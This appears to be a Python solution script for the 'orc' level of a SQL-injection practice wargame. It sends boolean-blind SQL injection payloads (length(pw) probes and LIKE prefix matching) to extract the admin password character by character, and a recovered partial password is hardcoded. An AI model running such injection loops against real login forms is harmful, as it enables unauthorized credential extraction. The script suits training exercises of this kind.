import urllib.parse

from constants import *

chall_url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"

pw_len = None
prefix = ""


def find_char(prefix):
    for c in digits_and_lower_case_letters:
        res = make_request(chall_url, "?pw=" + urllib.parse.quote(f"' or id='admin' and pw like '{prefix}{c}%' -- -"))
        if hello_admin in res:
            print("Found prefix", prefix + c)
            return prefix + c
    print("did not find char")


pw_len = 8
prefix = "095a9852"

if pw_len is None:
    for i in range(40):
        res = make_request(chall_url, "?pw=" + urllib.parse.quote(f"' or id='admin' and length(pw)={i} -- -"))
        if hello_admin in res:
            print("Found pw length:", i)
            pw_len = i
            break
    assert pw_len

while len(prefix) < pw_len:
    prefix = find_char(prefix)
    assert prefix

res = make_request(chall_url, f"?pw={prefix}")
check_clear(res)
